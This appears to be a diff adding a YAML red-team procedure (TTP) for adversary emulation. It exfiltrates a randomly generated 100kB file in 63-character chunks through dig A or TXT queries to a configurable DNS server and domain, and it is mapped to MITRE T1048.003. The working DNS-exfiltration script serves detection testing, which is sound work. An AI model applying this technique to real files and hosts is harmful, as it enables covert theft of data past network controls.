@@ -1,0 +1,80 @@
+#sudo apt install python3-dnslib
+
+---
+api_version: 2.0
+uuid: 08896c6c-4615-40b0-b6b7-3838768cd78f
+name: Data Exfil Over DNS {{.Args.type}} Records
+authors:
+  - cedowens
+description: |
+   This TTP will take a file over 100kB in size and send it out in chunks (63 characters) over DNS A or TXT records.
+requirements:
+  platforms:
+    - os: linux
+    - os: darwin
+mitre:
+  tactics:
+    - TA0010 Exfiltration
+  techniques:
+    - T1048 Exfiltration Over Alternative Protocol
+  subtechniques:
+    - T1048.003 Exfiltration Over Unencrypted Non-C2 Protocol
+
+args:
+  - name: domain
+    description: the domain to use for this dns data exfil (example.com)
+    type: string
+    default: example.com
+
+  - name: dns
+    description: IP address for dns server
+    type: string
+    default: 127.0.0.1
+
+  - name: type
+    description: DNS query type (A or TXT)
+    type: string
+    default: A
+
+steps:
+  - name: generate_file
+    description: Generating a random 100kB file...
+    inline: |
+      openssl rand -hex 55000 | tr -d '\n' > exfil_file.txt
+
+  - name: exfil_data
+    description: Attempting to exfiltrate 100kB file over DNS {{.Args.type}} records...
+    inline: |
+
+      if ! which dig &>/dev/null; then
+        echo "Error: dig is required to run this TTP"
+        exit 1
+      fi
+
+      if [ "{{.Args.type}}" != "A" ] && [ "{{.Args.type}}" != "TXT" ]; then
+        echo "type needs to be 'A' or 'TXT'"
+        exit 1
+      fi
+
+      if [ -e "exfil_file.txt" ]; then
+        while read line; do
+          if ! dig -t {{.Args.type}} @{{.Args.dns}} "${line}.{{.Args.domain}}" > /dev/null; then
+            echo "Error: DNS request failed - Check that server is running"
+            exit 1
+          fi
+        done < <(fold -w 63 exfil_file.txt)
+        echo "Exfiltration success!"
+        dig +tries=1 +time=1 -t A @{{.Args.dns}} "end" > /dev/null || true
+      else
+        echo "Failed: exfil_file.txt does not exist"
+        exit 1
+      fi
+
+    cleanup:
+      inline: |
+        if [ -e "exfil_file.txt" ]; then
+          rm exfil_file.txt
+          echo "Cleanup finished!"
+        else
+          echo "Failed to remove: exfil_file.txt"
+        fi
